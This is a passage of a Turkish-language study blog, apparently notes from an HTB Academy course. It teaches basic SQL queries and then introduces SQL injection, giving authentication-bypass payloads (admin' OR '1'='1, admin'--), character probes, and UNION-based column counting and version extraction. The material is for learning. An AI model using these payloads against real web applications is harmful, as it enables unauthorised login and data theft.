+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Varsayılan olarak sonuçların sıralanması <code>ascending order</code> yani küçükten büyüğe artan şekilde olur. Bunun spesifik olarak belirtimi <code>ASC</code> şeklindedir. Büyükten küçüğe azalan şekilde bir belirtim için <code>DESC</code> kullanılır. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">ORDER</span> <span class="keyword">BY</span> password <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Birden fazla parametreye göre sıralamak da mümkündür:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">ORDER</span> <span class="keyword">BY</span> password <span class="keyword">DESC</span>, id <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">| id | username      | password        | date_of_joining     |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | change_password | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | change_password | 2020-07-02 11:47:16 |</span><br><span class="line">|  4 | tom           | change_password | 2020-07-02 11:50:20 |</span><br><span class="line">+----+---------------+-----------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cok-Fazla-Sonuc-Donuyor-Nasil-Kisitlayabilirim"><a href="#Cok-Fazla-Sonuc-Donuyor-Nasil-Kisitlayabilirim" class="headerlink" title="Çok Fazla Sonuç Dönüyor Nasıl Kısıtlayabilirim?"></a>Çok Fazla Sonuç Dönüyor Nasıl Kısıtlayabilirim?</h2><p><code>LIMIT</code> komutu ile bu durum mümkündür. Diyelim ki şuan sadece 2 kayıt döndürmek istiyorum:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins LIMIT <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Belirlediğim bazı kayıtları görmek istiyorsam o zaman LIMIT komutundan sonra satır değeri girilir. En üstteki satır değerinin sıfır olduğu unutulmamaldır. Aynı bir programlama dilinde listedeki ilk değişkenin indeksinin 0 olması gibi burada da ilk satırın indeksi sıfırdır.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins LIMIT <span class="number">1</span>, <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç olarak bize ID değeri 2 ve 3 olan satırları döndürecektir:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |</span><br><span class="line">|  3 | john          | john123!   | 2020-07-02 11:47:16 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="WHERE-Cumlecigi"><a href="#WHERE-Cumlecigi" class="headerlink" title="WHERE Cümleciği"></a>WHERE Cümleciği</h2><p>Filtreleme yapmak ya da spesifik bir veriyi aramak için <code>WHERE</code> kullanılır. Genel syntax’ı şöyledir:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Filtreleme şeklindeki kullanımı:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Spesifik arama şeklindeki kullanımı:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Sayılar doğrudan kullanılabilirken, string ve tarih veri türleri başlarında tek tırnak (‘) veya çift tırnak (“) ile belirtilmelidirler.</p>
+</div>
+
+<h2 id="LIKE-Cumlecigi"><a href="#LIKE-Cumlecigi" class="headerlink" title="LIKE Cümleciği"></a>LIKE Cümleciği</h2><p><code>LIKE</code> belirli bir kalıba ya da şablona uyan verileri belirlememizi sağlar. <code>%</code> işareti dönecek veriyi referans eder yani kelimeden sonra gelen her karakteri bünyesine alır. Örneğin aşağıda admin kelimesi ile başlayan verilen döndürülmesi amaçlanmıştır:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username <span class="keyword">LIKE</span> <span class="string">&#x27;admin%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">| id | username      | password   | date_of_joining     |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br><span class="line">|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |</span><br><span class="line">|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |</span><br><span class="line">+----+---------------+------------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>_</code> işareti ise % işaretinin aksine yalnızca tek bir karakterle eşleşir. Örneğin:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username <span class="keyword">like</span> <span class="string">&#x27;___&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki örnekte 3 adet <code>_</code> işaretinden vardır. Yani biz logins tablosu içerisinde 3 harf uzunluğundaki kayıtları arıyoruz manasına gelir. Sonuç:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">| id | username | password | date_of_joining     |</span><br><span class="line">+----+----------+----------+---------------------+</span><br><span class="line">|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |</span><br><span class="line">+----+----------+----------+---------------------+</span><br></pre></td></tr></table></figure>
+
+<h1 id="Intro-to-SQL-Injections"><a href="#Intro-to-SQL-Injections" class="headerlink" title="Intro to SQL Injections"></a><strong><strong>Intro to SQL Injections</strong></strong></h1><p><code>Sanitizasyon</code>, herhangi bir enjeksiyon girişimini kırmak için kullanıcı girişindeki özel karakterlerin kaldırılması anlamına gelir. </p>
+<p>Enjeksiyon, bir uygulama kullanıcı girdisini bir string yerine gerçek kod olarak yanlış yorumladığında, kod akışını değiştirip yürüttüğünde meydana gelir. Bu, (‘) gibi özel bir karakter enjekte ederek ve ardından SQL Enjeksiyonlarında JavaScript kodu veya SQL gibi yürütülecek kod yazarak kullanıcı girişi sınırlarından kaçarak gerçekleşebilir. Kullanıcı girişi sterilize edilmedikçe, enjekte edilen kodun çalıştırılması çok olasıdır.</p>
+<h2 id="SQL-Injection-Kesfi"><a href="#SQL-Injection-Kesfi" class="headerlink" title="SQL Injection Keşfi"></a>SQL Injection Keşfi</h2><p>Özel karakter enjeksiyonu işin temeli olduğu için, gördüğümüz input alanlarına belirli başlı özel karakterleri yerleştirerek sayfanın davranışlarının değişmesine ve hata mesajlarına göz atarak enjeksiyona açık mı değil mi keşfedebiliriz.</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>URL Encoded</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘</td>
+<td>%27</td>
+</tr>
+<tr>
+<td>“</td>
+<td>%22</td>
+</tr>
+<tr>
+<td>#</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>;</td>
+<td>%3B</td>
+</tr>
+<tr>
+<td>)</td>
+<td>%29</td>
+</tr>
+</tbody></table>
+<p>Sorgumuzun her daim <code>true</code> olmasını istiyoruz ki istediğimiz sonuçlar dönsün. Bu minvalde sorgularımızın içerisinde <code>OR</code> kullanmak mantıklı olandır. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki gibi sonucunda TRUE döndüren sorgular ile payloadlarımızı şekillendiriyoruz. Burada dikkat etmemiz gereken en sonda bir <code>&#39;</code> işaretinin olmayışıdır. Bunun nedeni eğer oraya bir tane <code>&#39;</code> koyarsak halihazırda sorgunun kendisinden de gelen <code>&#39;</code> işareti dolayısıyla fazladan bir tane daha eklemiş oluruz. Bunu görselleştirecek olursak:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;X&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;something&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki gibi bir sorgu tipimiz var diyelim. Bunun içerisine <code>admin&#39; OR &#39;1&#39;=&#39;1</code> payload’ını eklersek şu şekilde gözükür:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27; admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1 &#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;something&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Bir tane eksik <code>‘</code> koymuş olmamız hem admin hem de 1&#x3D;1 belirtmelerinin tam olarak tırnak işaretleri ile belirtilmesine sebebiyet verdi. Velev ki biz <code>admin&#39; OR &#39;1&#39;=&#39;1&#39;</code> şeklinde bir payload ekleseydik bu durumda şöyle bir şeyle karşılacaktık:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27; admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="string">&#x27; AND password = &#x27;</span>something<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>Yukarıda görüldüğü üzere AND’in solundaki kırmızı tırnak işareti fazlalık oluşturdu ve bu hataya sebebiyet verebilir. </p>
+<p>Bu sorguların genel mantığını inceleyecek olursak şöyle bir açıklama getirebiliriz:</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled.png" alt="Untitled"></p>
+<p>En nihayetinde <code>TRUE</code> döndüğü için bu durum başarıyla enjeksiyon yapmamızı sağlayacaktır.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">PayloadsAllTheThings&#x2F;SQL Injection at master · swisskyrepo&#x2F;PayloadsAllTheThings</a></p>
+<h3 id="Commentlerin-Isin-Icine-Dahiliyeti"><a href="#Commentlerin-Isin-Icine-Dahiliyeti" class="headerlink" title="Commentlerin İşin İçine Dahiliyeti"></a>Commentlerin İşin İçine Dahiliyeti</h3><div class="note info flat"><p>🌐 <strong>Not:</strong> SQL’de yorum başlatmak için yalnızca iki tire kullanmak yeterli değildir. Bu nedenle, onlardan sonra boş bir boşluk olması gerekir, bu nedenle yorum (– ) ile başlar ve sonunda bir boşluk bulunur. URL’lerdeki boşluklar (+) olarak kodlandığından, bu bazen (–+) olarak kodlanmış URL’dir. Açıklığa kavuşturmak için, bir boşluk karakterinin kullanımını göstermek için sonuna (– -) başka bir (-) ekleyeceğiz.</p>
+</div>
+
+<p><code>#</code> ve <code>--</code> işaretleri genel olarak yorum amacıyla kullanılır. Örneğin <code>admin&#39;--</code> şeklindeki payloadımızı uyguladığımızı düşünelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="comment">-- &#x27; AND password = &#x27;something&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>Burada ne oldu? Burada olan adminden sonra gelen tırnak işaretinin ilgili değişkeni kapatması ve ardındaki <code>--</code> işaretinin yorum satırı olarak algılanmasıdır. Bu vesileyle yorum satırı dahilindeki hiçbir komut çalıştırılmayacağı için <code>&#39; AND password = &#39;something&#39;;</code> alanı yorum satırı içerisindedir ve görmezden gelinir. Bu sayede <code>authentication bypass</code> yapılır. </p>
+<p>Şimdi şöyle bir senaryo düşünelim:</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%201.png" alt="Untitled"></p>
+<p>Valid bir kullanıcı olan admin’e erişemiyoruz çünkü onun id değeri 1’dir. Parantez içerisindeki <code>AND id &gt; 1</code> belirtimi bizim elimizi kolumuzu bağlamakta. Comment atsak nasıl olur peki?</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%202.png" alt="Untitled"></p>
+<p>Bu da olmadı çünkü solda açık bir parantez var ve biz bunu kapatmadık. Kapanıyor ama yorum satırından sonra kapanıyor ve orası yorum satırı olduğu için işlem görmüyor ve bu yüzden parantez kapanmıyor. Bunun için yorum satırı akıllıca düşünerek şöyle düzenleyelim: <code>admin)&#39;--</code></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%203.png" alt="Untitled"></p>
+<p>Evet işte bu şekilde parantezi kapattık ve geri kalan kısmı yorum satırına almış olduk. Böylelikle girişi bypass etmiş olduk.</p>
+<h2 id="UNION-Cumlecigi"><a href="#UNION-Cumlecigi" class="headerlink" title="UNION Cümleciği"></a>UNION Cümleciği</h2><p><code>UNION</code> cümleciği, birden çok <code>SELECT</code> deyiminden elde edilen sonuçları birleştirmek için kullanılır. Bu, bir UNION enjeksiyonu aracılığıyla, DBMS’nin tamamından, birden çok tablodan ve veritabanından veri SEÇİMİ (select) ve dökümü (dump) yapabileceğimiz anlamına gelir.</p>
+<p>Örneğin tekli kullanımlara göz atalım. </p>
+<p><strong>Ports:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ports;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+-----------+</span><br><span class="line">| code     | city      |</span><br><span class="line">+----------+-----------+</span><br><span class="line">| CN SHA   | Shanghai  |</span><br><span class="line">| SG SIN   | Singapore |</span><br><span class="line">| ZZ-21    | Shenzhen  |</span><br><span class="line">+----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p><strong>Ships:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ships;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+-----------+</span><br><span class="line">| Ship     | city      |</span><br><span class="line">+----------+-----------+</span><br><span class="line">| Morrison | New York  |</span><br><span class="line">+----------+-----------+</span><br><span class="line">1 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi ise bu iki sorguyu UNION ile birleştirelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ports <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ships;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----------+-----------+</span><br><span class="line">| code     | city      |</span><br><span class="line">+----------+-----------+</span><br><span class="line">| CN SHA   | Shanghai  |</span><br><span class="line">| SG SIN   | Singapore |</span><br><span class="line">| Morrison | New York  |</span><br><span class="line">| ZZ-21    | Shenzhen  |</span><br><span class="line">+----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Çok Önemli Not:</strong> Seçilen kolonların tüm pozisyonlardaki veri tipleri aynı olmalıdır.</p>
+</div>
+
+<p>Bir tablonun 2 sütunu varken biz tek sütunluk bir sorguyla UNION kullanarak direkt veri çağrımı yapamayız. ‘junk’ data diyebileceğimiz bir veri ile sütun sayısını eşitleyip o şekilde bir çağrım yoluna gitmeliyiz. Örnekle açıklayalım:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> products <span class="keyword">where</span> product_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, <span class="number">2</span> <span class="keyword">from</span> passwords</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki örnekte products tablosunun iki adet sütunu var. Bu yüzden UNION’dan sonra gelecek SELECT sorgusununda iki adet sütun barındırması gerekir. Velev ki products tablosunun 4 tane sütunu olsaydı bizim UNION’dan sonra yazdığımız sorguda da dört tane parametre olması gerekirdi:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> passwords<span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Kodu tam olarak yazıp sonuçlarını görecek olursak:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> products <span class="keyword">where</span> product_id <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> <span class="keyword">from</span> passwords<span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-----------+-----------+-----------+</span><br><span class="line">| product_1 | product_2 | product_3 | product_4 |</span><br><span class="line">+-----------+-----------+-----------+-----------+</span><br><span class="line">|   admin   |    2      |    3      |    4      |</span><br><span class="line">+-----------+-----------+-----------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>İstediğimiz username’i almış olduk ve bu ilk satırdaki admin olarak bize döndürülmüştür. Geri kalan üç satırın da boş kalmaması için içlerine 2, 3 ve 4 yerleştirdik.</p>
+<p>Yani özetle <code>asıl sorgu olan soldaki sorgu ne kadar sütun barındırıyorsa sağına yazacağımız UNION sorgusu da o kadar sütun barındırmalıdır.</code></p>
+<h2 id="Tamam-Ben-SQL-Injection-Yapacagim-da-Kardesim-Ben-Bu-Sutun-Sayisini-Nasil-Kesfedecegim"><a href="#Tamam-Ben-SQL-Injection-Yapacagim-da-Kardesim-Ben-Bu-Sutun-Sayisini-Nasil-Kesfedecegim" class="headerlink" title="Tamam Ben SQL Injection Yapacağım da Kardeşim Ben Bu Sütun Sayısını Nasıl Keşfedeceğim?"></a>Tamam Ben SQL Injection Yapacağım da Kardeşim Ben Bu Sütun Sayısını Nasıl Keşfedeceğim?</h2><p>Bunun için iki güzel yöntemimiz vardır:</p>
+<ul>
+<li><code>ORDER BY</code> kullanmak</li>
+<li><code>UNION</code> kullanmak</li>
+</ul>
+<h3 id="ORDER-BY-Kullanimi"><a href="#ORDER-BY-Kullanimi" class="headerlink" title="ORDER BY Kullanımı"></a>ORDER BY Kullanımı</h3><p><code>ORDER BY</code> fonksiyonunun temel mantığı belirtilen sütuna göre sıralamaktır. Yani sen ORDER BY 1 dediğinde ilk sütun sıralama yapacaktır. ORDER BY 5 dediğin zaman ise 5. sütun sıralama yapılacaktır. Burada indeks sıfırdan başlar mantığı yoktur. Örneğin 7 tane sütun varsa biz ORDER BY 8 dediğimiz zaman hata alırız çünkü 8. sütun diye bir şey yoktur. Aynı şekilde ORDER BY 0 dediğimiz zaman da hata alırız çünkü 0. sütun diye de bir şey yoktur. Bu vesileyle ORDER BY 8’de hata alıyorsak ve ORDER BY 7’de hata almadan bir sonuç dönüyorsa o zaman o tabloda 7 sütun olduğunu söyleyebiliriz.</p>
+<p>Kullanım şekli olarak:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; order by 1--</span></span><br></pre></td></tr></table></figure>
+
+<p>şeklinde ve her seferinde arttıra arttıra hata alana kadar ilerleriz.</p>
+<h3 id="UNION-Kullanimi"><a href="#UNION-Kullanimi" class="headerlink" title="UNION Kullanımı"></a>UNION Kullanımı</h3><p>Burada sütun sayısı kadar UNION’dan sonra SELECT parametresi ile çağrım yaparız. Örneğin:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,2,3,4--</span></span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki örnekte SELECT’den sonra dört adet parametre girdik ve kolay olsun diye 1, 2, 3, 4 şeklinde sıraladık. Eğer cevap alıyorsak o zaman diyebiliriz ki bu tablo dört sütunludur. Biz burada 1, 2, 3 şeklinde üç parametre ya da 1, 2, 3, 4, 5 şeklinde beş parametre girmiş olsaydık sorgu bize hata döndürürdü. Çünkü bu sorgu yalnızca sütun sayısı bire bir eşleştiği zaman bize olumlu yanıt döndürür. Bu arada dikkat etmemiz gereken hangi sütunların bizim görebileceğimiz şekilde ekrana bastırılıp bastırılmadığıdır. Çünkü ekrana bastırılmayan bir sütunun içeriğini göremeyeceğimiz için oraya istediğimiz bilgi parametresini yazmak anlamsız olur.</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%204.png" alt="Untitled"></p>
+<p>Örneğin yukarıdaki tabloda 2, 3 ve 4. sütunlar gösterilmekte. Geriye kalan 1. sütun ise gizlidir. Muhtemelen 1. sütun id’yi temsil etmekte ve bu yüzden de gösterilmemekte. Şimdi biz gidip de istediğimiz bilgiyi 1. sütun içerisine yerleştirirsek dönen bilgi bize gözükmeyecektir çünkü 1. sütun gizlidir. O yüzden hangi sütunlar gösterimde hangileri gizli bunu bilmek önemlidir.</p>
+<hr>
+<p>Bu kısıma kadar bir nevi hazırlık aşamasıydı. Keşif yaptık, sql injection açığı aradık ve bulduk, sütun sayısı belirledik. Şimdi ise bir sonraki aşama olan bu elde ettiğimiz bilgiler vasıtasıyla database’den bilgi döndürme işlemleri var.</p>
+<p>Örneğin database versiyonunu döndürelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,@@version,3,4-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%205.png" alt="Untitled"></p>
+<hr>
